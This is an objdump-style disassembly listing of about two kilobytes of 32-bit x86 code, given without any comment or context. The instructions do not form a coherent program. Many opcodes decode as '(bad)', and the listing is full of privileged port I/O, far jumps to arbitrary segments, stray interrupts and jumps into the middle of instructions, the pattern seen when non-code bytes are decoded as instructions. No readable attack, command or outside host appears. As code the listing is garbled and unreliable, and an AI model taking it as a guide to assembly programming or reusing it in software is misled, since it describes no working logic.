  42235c:	mov    cl,al
  42235e:	xor    BYTE PTR [edx],ch
  422360:	test   al,0xa1
  422362:	pop    esp
  422363:	test   al,0xa7
  422365:	std    
  422366:	iret   
  422367:	aam    0x60
  422369:	call   0x9804:0x71726c00
  422370:	lock inc ebx
  422372:	or     dh,BYTE PTR [esi+0x6c891fe]
  422378:	je     0x4223a6
  42237a:	bound  ecx,QWORD PTR [ebx+esi*8+0x794dbef5]
  422381:	sbb    ch,ah
  422383:	mov    al,ds:0xcc31b7b0
  422388:	daa    
  422389:	(bad)  
  42238a:	push   0x11
  42238c:	xchg   ebx,eax
  42238d:	sub    al,0x55
  42238f:	or     esi,esp
  422391:	in     eax,0xd4
  422393:	mov    al,ds:0x608cede
  422398:	cmp    al,BYTE PTR [edx+ecx*4]
  42239b:	add    BYTE PTR [eax],0xb6
  42239e:	mov    esp,0x7e877868
  4223a3:	outs   dx,DWORD PTR ds:[esi]
  4223a4:	fst    st(6)
  4223a6:	and    DWORD PTR [eax-0x7b],0xccfe4903
  4223ad:	ins    DWORD PTR es:[edi],dx
  4223ae:	mov    edx,0x10aca8a4
  4223b3:	inc    edx
  4223b4:	sub    al,0xfc
  4223b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4223b7:	add    eax,0x4603aa8e
  4223bc:	arpl   WORD PTR [ecx],dx
  4223be:	aaa    
  4223bf:	inc    esp
  4223c0:	pop    ss
  4223c1:	push   ds
  4223c2:	hlt    
  4223c3:	xchg   ebp,eax
  4223c4:	xchg   edi,eax
  4223c5:	in     al,0x35
  4223c7:	out    0xd4,eax
  4223c9:	inc    esi
  4223ca:	jae    0x42244a
  4223cc:	xor    al,0xed
  4223ce:	pop    eax
  4223cf:	mov    ss,WORD PTR [edx-0x1d8aa2a5]
  4223d5:	inc    edx
  4223d6:	and    ah,BYTE PTR [esi]
  4223d8:	out    dx,al
  4223d9:	shl    ch,cl
  4223db:	push   es
  4223dc:	mov    bl,0xd9
  4223de:	and    DWORD PTR [eax],eax
  4223e0:	out    dx,al
  4223e1:	add    eax,0x7211ccc4
  4223e6:	out    0x19,eax
  4223e8:	call   0x9f95019f
  4223ed:	push   edi
  4223ee:	call   0xb741:0xc2fa7fcb
  4223f5:	fs in  eax,0xb
  4223f8:	ficom  WORD PTR [ecx]
  4223fa:	and    BYTE PTR [eax-0x14263558],0xb6
  422401:	mov    ah,0x35
  422403:	xlat   BYTE PTR ds:[ebx]
  422404:	ins    DWORD PTR es:[edi],dx
  422405:	sub    BYTE PTR [edx],ah
  422407:	push   edx
  422408:	and    eax,0xd5d3d18
  42240d:	or     esp,DWORD PTR [edx-0x5dfc1a58]
  422413:	jg     0x422468
  422415:	mov    bh,0xcc
  422417:	adc    ah,BYTE PTR [eax+edx*8+0x2c508da8]
  42241e:	lods   eax,DWORD PTR ds:[esi]
  42241f:	bound  esi,QWORD PTR gs:[ecx]
  422422:	sub    bh,al
  422424:	es inc esp
  422426:	mov    ah,0x31
  422428:	push   es
  422429:	aam    0x45
  42242b:	(bad)  
  42242c:	and    eax,0x766c5a68
  422431:	fs (bad) 
  422434:	add    ecx,DWORD PTR [esi]
  422436:	jmp    0x42249e
  422438:	mov    al,0x30
  42243a:	daa    
  42243b:	mov    edx,0xe61a1114
  422440:	mov    esp,DWORD PTR [esi-0x7f]
  422443:	xchg   ecx,eax
  422444:	outs   dx,DWORD PTR ds:[esi]
  422445:	gs loop 0x42246d
  422448:	ins    DWORD PTR es:[edi],dx
  422449:	call   0x29098eeb
  42244e:	lds    esp,FWORD PTR [edx+0x1408425a]
  422454:	retf   
  422455:	inc    ecx
  422456:	pop    ds
  422457:	(bad)  
  422458:	xchg   ecx,eax
  422459:	cld    
  42245a:	adc    ebp,DWORD PTR [ecx]
  42245c:	and    cl,cl
  42245e:	outs   dx,BYTE PTR ds:[esi]
  42245f:	imul   edi,edx,0x37822a8a
  422465:	inc    ecx
  422466:	cli    
  422467:	cmp    DWORD PTR ds:0xcab30137,ebp
  42246d:	jmp    0x42245a
  42246f:	xchg   ecx,eax
  422470:	sahf   
  422471:	and    eax,0x1c371ec6
  422476:	pop    es
  422477:	or     al,0x35
  422479:	cmp    DWORD PTR [esi-0x3],esi
  42247c:	es or  edi,edi
  42247f:	pop    edi
  422480:	jp     0x422426
  422482:	xchg   ecx,eax
  422483:	and    ah,ch
  422485:	and    eax,0x10b58996
  42248a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42248b:	(bad)  
  42248c:	cmp    al,0x76
  42248e:	out    dx,al
  42248f:	cmp    eax,0xb14a900c
  422494:	test   DWORD PTR [ebp+0x16],edx
  422497:	bound  esi,QWORD PTR ds:0xf18bba21
  42249d:	mov    esp,edi
  42249f:	(bad)  
  4224a0:	xchg   esi,eax
  4224a1:	lahf   
  4224a2:	pop    edx
  4224a3:	xor    esp,esi
  4224a5:	add    DWORD PTR [ebx],esi
  4224a7:	xor    BYTE PTR [ebx-0x4cec5507],bh
  4224ad:	push   ss
  4224ae:	add    esi,DWORD PTR [eax-0x1a12876]
  4224b4:	jne    0x4224ec
  4224b6:	in     al,0x1f
  4224b8:	sets   BYTE PTR [edx-0x4d12aa37]
  4224bf:	in     al,0xab
  4224c1:	add    ebx,DWORD PTR [ebx-0x2f4fd84c]
  4224c7:	mov    edi,0xbf58bc21
  4224cc:	cli    
  4224cd:	jmp    0x422451
  4224cf:	push   ecx
  4224d0:	xor    eax,0x253f3fdd
  4224d5:	mov    esi,DWORD PTR [edi+0x33]
  4224d8:	jp     0x4224aa
  4224da:	dec    ebp
  4224db:	xor    al,0x5f
  4224dd:	inc    esi
  4224de:	mov    ch,0x6e
  4224e0:	fdiv   QWORD PTR [ebp+0x1f]
  4224e3:	mov    ch,0xac
  4224e5:	jb     0x422538
  4224e7:	add    eax,0x68542030
  4224ec:	pop    ebp
  4224ed:	sbb    eax,DWORD PTR [ebx]
  4224ef:	lods   eax,DWORD PTR ds:[esi]
  4224f0:	fild   QWORD PTR [ecx]
  4224f2:	add    BYTE PTR [esi-0x48145384],bl
  4224f8:	xchg   esp,eax
  4224f9:	stos   DWORD PTR es:[edi],eax
  4224fa:	in     eax,dx
  4224fb:	xor    DWORD PTR [edi],edi
  4224fd:	jge    0x42247f
  4224ff:	pop    ds
  422500:	mov    ecx,0xf064d1f
  422505:	pop    edi
  422506:	out    dx,al
  422507:	cmp    eax,0xb70cb68d
  42250c:	mov    ch,0x1a
  42250e:	adc    eax,0xb6dd983f
  422513:	jl     0x42257b
  422515:	jle    0x4224eb
  422517:	scas   al,BYTE PTR es:[edi]
  422518:	sar    BYTE PTR [edx+ebx*1],cl
  42251b:	int3   
  42251c:	mov    dl,0xee
  42251e:	ds rcr ebx,cl
  422521:	add    eax,0x70ddd695
  422526:	sbb    eax,0x6120941a
  42252b:	mov    bl,0xe1
  42252d:	mov    WORD PTR [ebx-0x7e],?
  422530:	ss push 0x74
  422533:	xchg   ebx,eax
  422534:	jl     0x422502
  422536:	xchg   esi,eax
  422537:	inc    ecx
  422538:	add    eax,0xc7ce14be
  42253d:	bound  esi,QWORD PTR [edx]
  42253f:	xchg   ebx,eax
  422540:	(bad)  
  422542:	jbe    0x42254f
  422544:	cdq    
  422545:	adc    esi,0x6f275edf
  42254b:	adc    BYTE PTR [esi+0x43],0x54
  42254f:	ret    0x95c2
  422552:	mov    esi,0x7768f0f9
  422557:	adc    bl,BYTE PTR [esi-0x2ad249ac]
  42255d:	pop    esp
  42255e:	sbb    al,0x5f
  422560:	out    0x0,eax
  422562:	sbb    ebp,esi
  422564:	sub    ah,BYTE PTR [edx]
  422566:	jne    0x4225e2
  422568:	aad    0x1d
  42256a:	lds    edi,FWORD PTR [ebx-0x24e23165]
  422570:	jle    0x422548
  422572:	add    eax,0xe32f3330
  422577:	adc    esi,0xfffffffc
  42257a:	xchg   ebx,eax
  42257b:	mov    ecx,DWORD PTR [edx]
  42257d:	cld    
  42257e:	lock sub eax,0x8b42a73e
  422584:	jbe    0x42255a
  422586:	push   0x585e58ce
  42258b:	ror    DWORD PTR [ebp-0x40b7cc93],1
  422591:	sbb    DWORD PTR [ebp+0x36],0x359ca9ff
  422598:	pop    esp
  422599:	mov    cl,0xf8
  42259b:	add    eax,0xa7b0ba48
  4225a0:	popf   
  4225a1:	mov    ds:0x541baccc,al
  4225a6:	sti    
  4225a7:	mov    dl,BYTE PTR [eax-0x58aeab0b]
  4225ad:	test   al,0x66
  4225af:	xchg   edx,eax
  4225b0:	(bad)  
  4225b1:	jmp    0x91ab18d2
  4225b6:	mov    ds:0xb9216cc8,eax
  4225bb:	mov    esi,0xc9e68d11
  4225c0:	loopne 0x4225f6
  4225c2:	push   es
  4225c3:	pop    esi
  4225c4:	pop    DWORD PTR [ecx+0x27]
  4225c7:	test   al,0x21
  4225c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225ca:	ficom  WORD PTR [ebx]
  4225cc:	inc    edi
  4225cd:	loope  0x4225c3
  4225cf:	push   ss
  4225d0:	add    BYTE PTR [ecx-0x3ed0cdc9],bh
  4225d6:	jle    0x4225a9
  4225d8:	lods   eax,DWORD PTR ds:[esi]
  4225d9:	aam    0xa7
  4225db:	xor    DWORD PTR ds:0x88c3eeeb,edx
  4225e1:	inc    edi
  4225e2:	out    0x27,eax
  4225e4:	xchg   BYTE PTR [ecx+0x3e058d5a],al
  4225ea:	jmp    FWORD PTR [ecx+eax*2]
  4225ed:	cli    
  4225ee:	mov    edi,0x9cd8d849
  4225f3:	xchg   ebx,eax
  4225f4:	(bad)  [edx+eax*1+0x51]
  4225f8:	aam    0xed
  4225fa:	stc    
  4225fb:	ror    BYTE PTR [eax+0x209fb7d7],1
  422601:	push   cs
  422602:	dec    ebp
  422603:	js     0x42267a
  422605:	sahf   
  422606:	std    
  422607:	sti    
  422608:	push   esp
  422609:	add    ah,BYTE PTR [esi+ebp*2]
  42260c:	mov    eax,0xff130ea3
  422611:	out    0x52,al
  422613:	cmc    
  422614:	jne    0x422649
  422616:	cmp    al,0x3
  422618:	push   0xc7e7fcbc
  42261d:	jmp    0x4225ff
  42261f:	out    0x1c,eax
  422621:	inc    esp
  422622:	out    dx,eax
  422623:	mov    edi,0xd829b79a
  422628:	jbe    0x422621
  42262a:	jg     0x422696
  42262c:	push   edi
  42262d:	pop    ds
  42262e:	jl     0x422662
  422630:	es dec eax
  422632:	hlt    
  422633:	sub    eax,0x876a9828
  422638:	xor    cl,BYTE PTR [esi-0x1d18cdc5]
  42263e:	stc    
  42263f:	mov    ds:0xdf9cf755,eax
  422644:	or     DWORD PTR [esi-0x4d],0xffffff90
  422648:	dec    BYTE PTR [edi]
  42264a:	or     eax,0x65354f30
  42264f:	push   esp
  422650:	clc    
  422651:	jmp    0x172b918f
  422656:	push   ds
  422657:	add    ebx,esp
  422659:	mov    esi,?
  42265b:	cs mov ebp,0x31180a2a
  422661:	(bad)  
  422662:	retf   
  422663:	push   ds
  422664:	push   ebx
  422665:	fld    TBYTE PTR [esi]
  422667:	mov    esi,0xb435d2d3
  42266c:	xor    eax,0xcbd1c5bf
  422671:	jmp    0x9d40:0x6015b1f8
  422678:	xchg   ebx,eax
  422679:	jbe    0x4226e3
  42267b:	and    esi,edx
  42267d:	add    ch,ah
  42267f:	or     bh,0x28
  422682:	int    0x1a
  422684:	mov    edi,0x5a8034f9
  422689:	sbb    al,0x6e
  42268b:	addr16 push edi
  42268d:	outs   dx,BYTE PTR ds:[esi]
  42268e:	mov    al,ds:0x9fc4a85a
  422693:	xchg   esp,eax
  422694:	pop    edx
  422695:	scas   al,BYTE PTR es:[edi]
  422696:	xchg   BYTE PTR [eax-0x62a29bbb],dl
  42269c:	mov    bl,0x9a
  42269e:	enter  0x8200,0x22
  4226a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226a3:	sbb    DWORD PTR [ebp+0x3e],esi
  4226a6:	mov    dh,BYTE PTR [esi+0x1bb62429]
  4226ac:	(bad)  
  4226ae:	mov    dh,0xdb
  4226b0:	loop   0x422656
  4226b2:	jecxz  0x42271f
  4226b4:	ret    
  4226b5:	enter  0xb566,0x89
  4226b9:	std    
  4226ba:	dec    esi
  4226bb:	leave  
  4226bc:	mov    esi,0xd707e412
  4226c1:	adc    BYTE PTR [ebx],al
  4226c3:	mov    bl,BYTE PTR [esi+0xb182417]
  4226c9:	clc    
  4226ca:	and    DWORD PTR [ecx-0x56],ebx
  4226cd:	jne    0x422715
  4226cf:	test   al,0x5d
  4226d1:	push   edi
  4226d2:	xchg   edi,eax
  4226d3:	mov    dh,0x22
  4226d5:	dec    edi
  4226d6:	pop    edi
  4226d7:	call   0x53f2:0xca0ffcf5
  4226de:	pop    esi
  4226df:	sbb    DWORD PTR [esi],ecx
  4226e1:	mov    ebx,0xe948c568
  4226e6:	jno    0x422710
  4226e8:	pop    esp
  4226e9:	cdq    
  4226ea:	int    0x4c
  4226ec:	das    
  4226ed:	pop    esi
  4226ee:	mov    eax,ds:0xefc740ac
  4226f3:	sbb    edi,DWORD PTR ds:0x92c15563
  4226f9:	mov    ebx,0x2cd8e1a8
  4226fe:	sub    eax,0xbdecc83e
  422703:	sbb    al,BYTE PTR [ebp-0x13dd1bae]
  422709:	sub    eax,0x137f57c3
  42270e:	ins    BYTE PTR es:[edi],dx
  42270f:	shr    BYTE PTR [eax-0x293da904],cl
  422715:	(bad)  
  422717:	add    eax,0x403c990e
  42271c:	adc    ch,BYTE PTR [eax]
  42271e:	dec    esi
  42271f:	cmp    BYTE PTR [edi+ecx*1],dl
  422722:	in     al,0x32
  422724:	lods   al,BYTE PTR ds:[esi]
  422725:	popa   
  422726:	rcr    DWORD PTR [edi+0x6770c5ee],cl
  42272c:	jmp    0x45a55718
  422731:	test   eax,0xb6612b8e
  422736:	add    BYTE PTR [edi+0x51],ch
  422739:	bound  ebx,QWORD PTR [edx+0x71]
  42273c:	outs   dx,DWORD PTR ds:[esi]
  42273d:	popa   
  42273e:	sti    
  42273f:	sbb    eax,0x46b43f76
  422744:	jmp    0x69b7:0xb593adb1
  42274b:	mov    BYTE PTR [ebp-0x13988109],bl
  422751:	cmp    ah,BYTE PTR [edx+0x36]
  422754:	inc    ecx
  422755:	xchg   edx,eax
  422756:	sar    DWORD PTR [edx+0x70],0x9f
  42275a:	sbb    dl,ch
  42275c:	mov    esp,gs
  42275e:	cs test al,0x10
  422761:	pusha  
  422762:	inc    ebx
  422763:	arpl   WORD PTR [ebx+ebx*1-0x68],si
  422767:	dec    edi
  422768:	clc    
  422769:	out    dx,al
  42276a:	dec    edi
  42276b:	aas    
  42276c:	add    BYTE PTR [esi+0x1dc732fa],cl
  422772:	mov    ebx,0x9a7a946f
  422777:	mov    ebp,0xdf5da5ea
  42277c:	aam    0xbc
  42277e:	mov    bh,0x57
  422780:	nop
  422781:	cmp    DWORD PTR [ebx],esi
  422783:	inc    edx
  422784:	xchg   ax,ax
  422786:	pop    edi
  422787:	mov    al,ds:0xd5bc44d0
  42278c:	rol    ch,1
  42278e:	ss push cs
  422790:	shl    dl,1
  422792:	dec    esi
  422793:	fstp   DWORD PTR [edi-0x424fab52]
  422799:	push   ss
  42279a:	fisubr DWORD PTR [eax+0x108f635b]
  4227a0:	mov    ds,WORD PTR [esi]
  4227a2:	imul   edi,DWORD PTR [eax-0x1b4f4a7c],0xe516980b
  4227ac:	addr16 push cs
  4227ae:	cs ja  0x4227d9
  4227b1:	sub    al,0xf
  4227b3:	out    dx,eax
  4227b4:	dec    esp
  4227b5:	outs   dx,DWORD PTR ds:[esi]
  4227b6:	test   DWORD PTR ds:0xa238fa98,ebx
  4227bc:	outs   dx,BYTE PTR ds:[esi]
  4227bd:	inc    esi
  4227be:	and    esi,DWORD PTR [edx-0x58327852]
  4227c4:	push   ds
  4227c5:	or     bl,bl
  4227c7:	adc    eax,0x37ef9e7b
  4227cc:	or     al,0x6d
  4227ce:	(bad)  
  4227cf:	out    0xcf,al
  4227d1:	std    
  4227d2:	inc    eax
  4227d3:	aaa    
  4227d4:	or     DWORD PTR [edx+0x1916e76b],0xffffff9a
  4227db:	sbb    eax,0xdedce78e
  4227e0:	mov    ebx,0x35769987
  4227e5:	std    
  4227e6:	or     eax,0x14c7740c
  4227eb:	cmp    edi,ebx
  4227ed:	and    al,BYTE PTR [ebp+0x57]
  4227f0:	cmp    BYTE PTR [esp+ebp*8+0x1b1b48ac],0x79
  4227f8:	adc    BYTE PTR [edx-0x6bce01a8],bl
  4227fe:	lods   eax,DWORD PTR ds:[esi]
  4227ff:	xor    BYTE PTR [ebx+ebp*2],ch
  422802:	sti    
  422803:	cli    
  422804:	xor    edx,DWORD PTR [ecx+0x2a]
  422807:	cmp    DWORD PTR [ebx-0xa783d81],esp
  42280d:	or     eax,0x803d2cf4
  422812:	js     0x42286b
  422814:	adc    bh,dl
  422816:	neg    ebx
  422818:	jnp    0x4227fc
  42281a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42281b:	lds    ebp,FWORD PTR [ebp-0x8]
  42281e:	into   
  42281f:	dec    ebp
  422820:	xor    BYTE PTR [eax-0x503f98ec],ah
  422826:	push   ebp
  422827:	(bad)  
  422828:	push   ss
  422829:	pusha  
  42282a:	sub    dh,BYTE PTR [ebp+0x37cdd142]
  422830:	push   es
  422831:	in     al,dx
  422832:	scas   eax,DWORD PTR es:[edi]
  422833:	iret   
  422834:	xor    eax,0x32006d3f
  422839:	fild   WORD PTR [esi+0x2]
  42283c:	daa    
  42283d:	mov    ecx,0x44da00c1
  422842:	sbb    DWORD PTR [eax-0x69],esi
  422845:	xchg   ecx,eax
  422846:	xchg   ecx,eax
  422847:	dec    edi
  422848:	daa    
  422849:	inc    edi
  42284a:	lea    ecx,[edi]
  42284c:	add    eax,DWORD PTR [ebx-0x5300bbd9]
  422852:	loope  0x42282b
  422854:	or     eax,0x6e7aaaeb
  422859:	push   ebp
  42285a:	popf   
  42285b:	hlt    
  42285c:	pop    edi
  42285d:	dec    eax
  42285e:	in     al,0xbe
  422860:	in     al,0x31
  422862:	je     0x4227e5
  422864:	mov    al,ds:0x31ed7837
  422869:	jle    0x42282e
  42286b:	xor    BYTE PTR [ebp-0x65],al
  42286e:	mov    WORD PTR [esi],cs
  422870:	xchg   DWORD PTR [esi],edx
  422872:	not    BYTE PTR [esi]
  422874:	aas    
  422875:	lea    ebx,[ecx+0x31]
  422878:	jmp    0x3b67:0x8ab56887
  42287f:	xor    BYTE PTR [edi+0x77],dl
  422882:	inc    esp
  422883:	jle    0x42288e
  422885:	pop    ss
  422886:	bound  esp,QWORD PTR [ebp-0x7435ca15]
  42288c:	xor    ecx,edi
  42288e:	pop    eax
  42288f:	jecxz  0x42290f
  422891:	imul   DWORD PTR [ebp-0x40fab2a0]
  422897:	scas   eax,DWORD PTR es:[edi]
  422898:	xor    eax,0x9a0045a7
  42289d:	and    al,0x0
  42289f:	outs   dx,BYTE PTR ds:[esi]
  4228a0:	rcl    edi,1
  4228a2:	add    esp,DWORD PTR [ecx]
  4228a4:	xchg   ebx,eax
  4228a5:	leave  
  4228a6:	xor    al,0xf8
  4228a8:	into   
  4228a9:	std    
  4228aa:	mov    eax,0xf560d1e1
  4228af:	pop    esp
  4228b0:	jbe    0x4228f1
  4228b2:	popf   
  4228b3:	jbe    0x422854
  4228b5:	loopne 0x42292e
  4228b7:	and    al,0xea
  4228b9:	jge    0x422879
  4228bb:	jmp    0x497ff1d4
  4228c0:	or     ch,dh
  4228c2:	retf   0xd92f
  4228c5:	gs nop
  4228c7:	rol    BYTE PTR [eax+edi*8],1
  4228ca:	push   DWORD PTR [eax]
  4228cc:	dec    edx
  4228cd:	and    DWORD PTR [ebp+0x6345f7fb],edx
  4228d3:	out    0x13,al
  4228d5:	loop   0x422885
  4228d7:	int3   
  4228d8:	or     dl,BYTE PTR [esi]
  4228da:	push   ss
  4228db:	(bad)  
  4228dd:	xchg   esi,eax
  4228de:	jnp    0x4228ca
  4228e0:	add    ah,dh
  4228e2:	test   BYTE PTR [ebp+0x57e2ef18],bl
  4228e8:	mov    edi,0xf1d19a5f
  4228ed:	ins    BYTE PTR es:[edi],dx
  4228ee:	mov    eax,ds:0x38faf540
  4228f3:	(bad)  
  4228f4:	xor    eax,0x8b03ef47
  4228f9:	cmc    
  4228fa:	popa   
  4228fb:	ror    DWORD PTR [ebx-0x66],1
  4228fe:	int3   
  4228ff:	in     eax,0x37
  422901:	cmp    edi,DWORD PTR [ecx+eiz*2]
  422904:	imul   eax,DWORD PTR ds:0x32b8635b,0x4a
  42290b:	ins    DWORD PTR es:[edi],dx
  42290c:	jmp    0x23ec2da4
  422911:	or     cl,BYTE PTR [edi-0x4a969d61]
  422917:	mov    DWORD PTR [eax-0x25],esp
  42291a:	aaa    
  42291b:	mov    ah,0xd7
  42291d:	push   ecx
  42291e:	retf   
  42291f:	sti    
  422920:	jg     0x4228fb
  422922:	adc    ah,BYTE PTR [ecx]
  422924:	(bad)  
  422925:	test   BYTE PTR [edi+0x64],bh
  422928:	xchg   ecx,eax
  422929:	fucomp st(1)
  42292b:	mov    bl,0x8
  42292d:	pop    ebp
  42292e:	(bad)  
  42292f:	xchg   ebp,eax
  422930:	pushf  
  422931:	pop    ds
  422932:	scas   al,BYTE PTR es:[edi]
  422933:	jl     0x42296e
  422935:	inc    ebp
  422936:	inc    edx
  422937:	xchg   ecx,eax
  422938:	les    ebp,FWORD PTR [esi]
  42293a:	add    esp,DWORD PTR [eax+0x2f5fff58]
  422940:	inc    ecx
  422941:	jge    0x422943
  422943:	mov    DWORD PTR [esp+ebp*1],edi
  422946:	cmp    edi,DWORD PTR [eax]
  422948:	dec    ecx
  422949:	xor    eax,0x66f0acc6
  42294e:	ret    
  42294f:	mov    ds:0xc7ce3182,eax
  422954:	dec    eax
  422955:	js     0x42297e
  422957:	mov    eax,DWORD PTR [ecx]
  422959:	inc    ecx
  42295a:	aaa    
  42295b:	ins    DWORD PTR es:[edi],dx
  42295c:	mov    ch,0xbc
  42295e:	mul    DWORD PTR [ebx-0x65f077d3]
  422964:	mov    dl,0xde
  422966:	cmc    
  422967:	aaa    
  422968:	mov    ds:0x8b21d21f,eax
  42296d:	mov    bh,0xd8
  42296f:	add    bh,BYTE PTR [ecx]
  422971:	adc    BYTE PTR [ecx+eiz*2],0x24
  422975:	and    cl,BYTE PTR [ecx]
  422977:	adc    ah,cl
  422979:	in     eax,dx
  42297a:	pop    ecx
  42297b:	cmp    DWORD PTR [edx+0xb67d47f],ebp
  422981:	push   ebp
  422982:	int    0xe3
  422984:	imul   esi,DWORD PTR [esi],0x39b3b8cb
  42298a:	ss daa 
  42298c:	cmp    al,ch
  42298e:	pop    ecx
  42298f:	jno    0x4229f2
  422991:	ror    DWORD PTR [edi],0xb7
  422994:	mov    dh,0x94
  422996:	mov    dh,0xe6
  422998:	pusha  
  422999:	mov    bl,BYTE PTR [di+0x3a]
  42299d:	call   0xb307:0x169c10f
  4229a4:	jl     0x4229ad
  4229a6:	ror    DWORD PTR [eax+0x3f],0xe7
  4229aa:	inc    ebx
  4229ab:	mov    BYTE PTR [eax],cl
  4229ad:	test   DWORD PTR [eax-0x1191e651],ebp
  4229b3:	jnp    0x422992
  4229b5:	(bad)  
  4229b6:	xchg   edi,eax
  4229b7:	bound  ebx,QWORD PTR [ecx-0x29]
  4229ba:	pop    esi
  4229bb:	cmp    al,0xd3
  4229bd:	push   ss
  4229be:	mov    al,0x5e
  4229c0:	jmp    0x4229d7
  4229c2:	repnz repz and al,0xd6
  4229c6:	pop    ecx
  4229c7:	xchg   DWORD PTR [ebx-0x2f],eax
  4229ca:	mov    esi,0x6d61ef8
  4229cf:	xchg   edx,eax
  4229d0:	nop
  4229d1:	ins    BYTE PTR es:[edi],dx
  4229d2:	sub    al,0x5d
  4229d4:	es push ds
  4229d6:	push   edx
  4229d7:	aad    0xcf
  4229d9:	sub    DWORD PTR [ebx],esp
  4229db:	pop    ebp
  4229dc:	icebp  
  4229dd:	adc    dl,BYTE PTR ds:0xa6ae1049
  4229e3:	ins    DWORD PTR es:[edi],dx
  4229e4:	mov    ebx,0x2ac70e46
  4229e9:	ja     0x422a4e
  4229eb:	outs   dx,DWORD PTR ds:[esi]
  4229ec:	mov    eax,0x3c645522
  4229f1:	in     eax,dx
  4229f2:	in     eax,0x8c
  4229f4:	ja     0x422986
  4229f6:	xor    eax,0x878b01cd
  4229fb:	jb     0x4229f8
  4229fd:	push   ds
  4229fe:	(bad)  
  4229ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422a00:	or     ebx,edi
  422a02:	(bad)  
  422a03:	mov    cl,0xf9
  422a05:	test   eax,0x1e16ebdd
  422a0a:	mov    ecx,0xc7bc1670
  422a0f:	mov    edx,0x5cc3ee7e
  422a14:	in     al,0x33
  422a16:	and    al,0xeb
  422a18:	(bad)  [eax+0x5293716]
  422a1e:	add    bl,0xd2
  422a21:	out    0xa,al
  422a23:	rcr    BYTE PTR [edx+0x31b8ec42],1
  422a29:	and    DWORD PTR ds:0x75b3fefa,ebp
  422a2f:	popf   
  422a30:	retf   
  422a31:	gs dec edi
  422a33:	js     0x422a7d
  422a35:	cld    
  422a36:	dec    edi
  422a37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422a38:	sti    
  422a39:	or     ebp,DWORD PTR [ebx-0x54]
  422a3c:	mov    edi,0xef2cb95a
  422a41:	sub    eax,0xba0887ba
  422a46:	cld    
  422a47:	inc    bp
  422a49:	imul   esp,DWORD PTR [esi],0xf448d513
  422a4f:	and    BYTE PTR [ecx-0x39],al
  422a52:	mov    DWORD PTR [edx+0x1f],ebx
  422a55:	xchg   edi,eax
  422a56:	xchg   BYTE PTR [eax-0x38faa52b],cl
  422a5c:	mov    DWORD PTR [esi],esi
  422a5e:	cmp    eax,0x7882a956
  422a63:	lock or DWORD PTR [ebp-0xa],esi
  422a67:	fnstcw WORD PTR [edi]
  422a69:	jbe    0x422a12
  422a6b:	or     ebp,DWORD PTR [edi-0x5d]
  422a6e:	sahf   
  422a6f:	inc    ebp
  422a70:	xchg   ebp,eax
  422a71:	clc    
  422a72:	xor    eax,0x7160f644
  422a77:	loope  0x422a18
  422a79:	and    DWORD PTR [ecx],ebp
  422a7b:	sbb    eax,0x7eb122d8
  422a80:	pop    esi
  422a81:	out    dx,al
  422a82:	mov    WORD PTR [ebx],?
  422a84:	pop    esp
  422a85:	mov    ah,BYTE PTR [edx+edi*2]
  422a88:	xchg   esi,eax
  422a89:	test   al,0x40
  422a8b:	les    ebp,FWORD PTR [ebx]
  422a8d:	fidiv  WORD PTR ds:0x2307e96f
  422a93:	jmp    0x6f173f20
  422a98:	cmp    esp,DWORD PTR [ebx]
  422a9a:	adc    al,0x51
  422a9c:	cmp    BYTE PTR [edi-0x15],bl
  422a9f:	xchg   ebx,eax
  422aa0:	jmp    0x422ab3
  422aa2:	or     ecx,DWORD PTR [ecx]
  422aa4:	rcr    dh,1
  422aa6:	cmp    ecx,DWORD PTR [ecx]
  422aa8:	jg     0x422ab9
  422aaa:	mov    eax,ds:0xbe94e0d2
  422aaf:	push   cs
  422ab0:	jmp    0x7f02be23
  422ab5:	seta   BYTE PTR [ebx+0x116f4f6f]
  422abc:	xlat   BYTE PTR ds:[ebx]
  422abd:	xor    dl,ah
  422abf:	xchg   ebp,eax
  422ac0:	call   DWORD PTR [ebp+0x1c7e3559]
  422ac6:	pop    ss
  422ac7:	xchg   ebp,eax
  422ac8:	cld    
  422ac9:	icebp  
  422aca:	aas    
  422acb:	out    dx,eax
  422acc:	dec    esp
  422acd:	jp     0x422a8e
  422acf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ad0:	mov    ds:0x93cd95fc,al
  422ad5:	test   al,0xac
  422ad7:	xor    al,BYTE PTR [edx+0x5f]
  422ada:	ss loopne 0x422b0e
  422add:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ade:	add    eax,0x1f5c4321
  422ae3:	jno    0x422b49
  422ae5:	hlt    
  422ae6:	jmp    DWORD PTR [ebx+0x3f6304a9]
  422aec:	xchg   esi,eax
  422aed:	int    0x37
  422aef:	ds mov bh,0x1b
  422af2:	push   0x47
  422af4:	sub    al,0xf2
  422af6:	sti    
  422af7:	add    eax,0x7369e5c9
  422afc:	dec    ebx
  422afd:	iretw  
  422aff:	jle    0x422b21
  422b01:	push   cs
  422b02:	bound  esi,QWORD PTR ds:0xd5458d64
  422b08:	mov    DWORD PTR [ecx],ecx
  422b0a:	mov    esi,0x92f42873
  422b0f:	jbe    0x422b7f
  422b11:	fcomp  st(0)
  422b13:	inc    edi
  422b14:	jmp    0xfb5c:0x44a6bcfd
  422b1b:	xchg   esp,eax
  422b1c:	out    0x96,al
  422b1e:	out    0x6e,eax
  422b20:	aas    
  422b21:	shr    ecx,0x32
  422b24:	out    0x5d,eax
  422b26:	adc    al,0x48
  422b28:	ja     0x422b84
  422b2a:	cmp    esi,esp
  422b2c:	xchg   DWORD PTR [ebx],edx
  422b2e:	jae    0x34e37d18
  422b34:	mov    bh,0x75
  422b36:	ret    0xa19d
  422b39:	enter  0x1491,0xa4
  422b3d:	mov    WORD PTR ds:0x5e86150d,fs
  422b43:	int3   
  422b44:	ja     0x422b2a
  422b46:	xchg   esi,eax
  422b47:	daa    
  422b48:	mov    bh,0xec
  422b4a:	mov    al,0x53
  422b4c:	gs pop es
  422b4e:	in     al,dx
  422b4f:	jnp    0x422ae7
  422b51:	mov    WORD PTR [eax+0xf53c95a],ss
  422b57:	rol    BYTE PTR [edi+0x33],0x7d
  422b5b:	lea    esi,[edi+eiz*8+0x20]
  422b5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
